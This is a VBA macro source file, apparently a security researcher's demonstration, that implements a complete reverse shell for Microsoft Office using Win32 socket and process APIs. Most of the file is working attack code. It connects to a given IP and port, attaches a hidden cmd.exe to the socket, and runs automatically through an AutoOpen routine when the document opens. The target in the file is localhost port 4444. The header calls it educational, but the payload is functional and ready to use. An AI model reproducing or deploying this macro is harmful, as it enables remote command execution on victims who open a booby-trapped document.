' ********************************************************************************************************
'
' VBA reverse shell that uses Win32 API calls. Most of the code was copied from the following resources:
'
'   * https://stackoverflow.com/questions/8670391
'   * https://stackoverflow.com/questions/43197814
'   * https://renenyffenegger.ch/notes/development/languages/VBA/Win-API/examples/
'
' The code demonstrates more complex usage example for calling Win32 API from VBA and should be used
' for educational purpose only. During development I was mainly interested whether the WSAData or the
' PROCESS_INFORMATION structure can be replaced by a raw byte array. In case of PROCESS_INFORMATION it
' worked, but for WSAData MS Office crashed sometimes, despite the reverse shell worked anyway. If you
' know what is happening there I would be interested to hear about :)
'
' Author: Tobias Neitzel (@qtc_de)
'
' ********************************************************************************************************
Private Type WSAData
   wVersion As Integer
   wHighVersion As Integer
   szDescription(0 To 255) As Byte
   szSystemStatus(0 To 128) As Byte
   iMaxSockets As Integer
   iMaxUdpDg As Integer
   lpVendorInfo As Long
End Type

Private Type sockaddr_in
    sin_family As Integer
    sin_port As Integer
    sin_addr As Long
    sin_zero(0 To 7) As Byte
End Type

Private Type PROCESS_INFORMATION
    hProcess    as longPtr
    hThread     as longPtr
    dwProcessId as long
    dwThreadId  as long
End Type

Private Type STARTUPINFO
    cb              As Long
    lpReserved      As String
    lpDesktop       As String
    lpTitle         As String
    dwX             As Long
    dwY             As Long
    dwXSize         As Long
    dwYSize         As Long
    dwXCountChars   As Long
    dwYCountChars   As Long
    dwFillAttribute As Long
    dwFlags         As Long
    wShowWindow     As Integer
    cbReserved2     As Integer
    lpReserved2     As Byte
    hStdInput       As LongPtr
    hStdOutput      As LongPtr
    hStdError       As LongPtr
End Type

Private Declare PtrSafe Function WSAStartup Lib "ws2_32" ( _
     ByVal wVersionRequested As Integer, _
     ByRef data As WSAData _
     ) As Long

Private Declare PtrSafe Function connect Lib "ws2_32" ( _
    ByVal socket As LongPtr, _
    ByRef sockaddr As sockaddr_in, _
    ByVal namelen As Long _
    ) As Long

Private Declare PtrSafe Function closesocket Lib "ws2_32" ( _
    ByVal socket As LongPtr _
    ) As Long

Private Declare PtrSafe Function WSASocketA Lib "ws2_32" ( _
    ByVal af As Long, _
    ByVal typ As Long, _
    ByVal protocol As Long, _
          lpProtocolInfo As Any, _
    ByVal g As Long, _
    ByVal dwFlags As Long _
    ) As Long

Public Declare Function inet_addr Lib "ws2_32" ( _
    ByVal cp As String _
    ) As Long

Public Declare Function htons Lib "ws2_32" ( _
    ByVal hostshort As Integer _
    ) As Integer

Private Declare PtrSafe Function CreateProcess Lib "kernel32" Alias "CreateProcessA" ( _
    ByVal lpApplicationName As String, _
    ByVal lpCommandLine As String, _
    ByRef lpProcessAttributes As Any, _
    ByRef lpThreadAttributes As Any, _
    ByVal bInheritHandles As Long, _
    ByVal dwCreationFlags As Long, _
    ByVal lpEnvironment As LongPtr, _
    ByVal lpCurrentDirectory As String, _
          lpStartupInfo As STARTUPINFO, _
          lpProcessInformation As PROCESS_INFORMATION _
    ) As LongPtr

Private Declare PtrSafe Function WSAGetLastError Lib "ws2_32" () As Long


Function ReverseShell(IP As String, PORT As Integer) As Long

    Dim socket                As LongPtr
    Dim addr                  As sockaddr_in
    Dim ret                   As Long
    Dim data                  As WSAData
    Dim si                    As STARTUPINFO
    Dim pi                    As PROCESS_INFORMATION
    
    ret = WSAStartup(&H202, data)

    If (ret <> 0) Then
        ReverseShell = WSAGetLastError()
        Exit Function
    End If

    socket = WSASocketA(2, 1, 0, ByVal 0&, 0, 0)
    If (socket = -1) Then
        ReverseShell = WSAGetLastError()
        Exit Function
    End If

    addr.sin_family = 2
    addr.sin_port = htons(PORT)
    addr.sin_addr = inet_addr(IP)
    ret = connect(socket, addr, Len(addr))

    If (ret <> 0) Then
        ReverseShell = WSAGetLastError()
        Exit Function
    End If

    si.cb = LenB(si)
    si.dwFlags = &H100
    si.hStdInput = socket
    si.hStdOutput = socket
    si.hStdError = socket
    
    Call CreateProcess(vbNullString, "cmd.exe", ByVal 0&, ByVal 0&, True, &H8000000, ByVal 0&, vbNullString, si, pi)
    closesocket(socket)

End Function


Sub AutoOpen()
    Call ReverseShell("127.0.0.1", 4444)
End Sub
